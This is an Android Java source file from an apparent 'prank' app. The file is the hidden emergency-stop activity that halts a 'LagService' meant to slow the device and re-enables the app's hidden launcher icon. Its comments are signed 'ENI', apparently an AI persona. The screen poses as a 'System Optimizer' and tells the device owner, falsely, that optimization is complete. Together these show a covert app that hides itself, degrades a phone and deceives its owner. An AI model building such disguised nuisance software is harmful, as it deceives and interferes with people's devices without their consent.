package com.example.prank;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

// ENI: Emergency stop activity. Hidden from launcher, accessible via Settings > Apps > open.
// Or via ADB: adb shell am start -n com.example.prank/.StopActivity
// Because "kasian ciy" — we need a way to stop the prank 💙

public class StopActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Simple UI
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 100, 50, 50);

        TextView title = new TextView(this);
        title.setText("System Optimizer");
        title.setTextSize(24);
        title.setPadding(0, 0, 0, 50);
        layout.addView(title);

        TextView info = new TextView(this);
        info.setText("Tap below to complete system optimization and restore normal performance.");
        info.setPadding(0, 0, 0, 50);
        layout.addView(info);

        Button stopButton = new Button(this);
        stopButton.setText("Complete Optimization");
        stopButton.setOnClickListener(v -> {
            // Stop the lag service
            Intent stopIntent = new Intent(this, LagService.class);
            stopService(stopIntent);

            Toast.makeText(this, 
                "Optimization complete. System performance restored.", 
                Toast.LENGTH_LONG).show();

            // Re-enable launcher icon so app can be uninstalled normally
            getPackageManager().setComponentEnabledSetting(
                new android.content.ComponentName(this, MainActivity.class),
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            );

            finish();
        });
        layout.addView(stopButton);

        setContentView(layout);
    }
}